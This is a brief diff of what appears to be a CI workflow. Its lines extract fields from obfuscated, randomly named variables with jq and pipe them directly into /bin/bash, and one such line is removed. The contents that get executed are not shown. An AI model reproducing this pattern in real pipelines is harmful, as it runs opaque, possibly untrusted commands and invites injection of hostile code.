@@ -22,7 +22,6 @@ jobs:
           echo $xssyf84 | jq -r .bpjr64 | /bin/bash
           echo $npcp8 | jq -r .ubc387 | /bin/bash
           printf '%s' "$cl443" | jq -r .yn5811 | /bin/bash
-          printf '%s' "$itqg72491" | jq -r .iwk5006 | /bin/bash
           printf '%s' "$e74" | jq -r .jonao22 | /bin/bash
 
       - name: Upload results
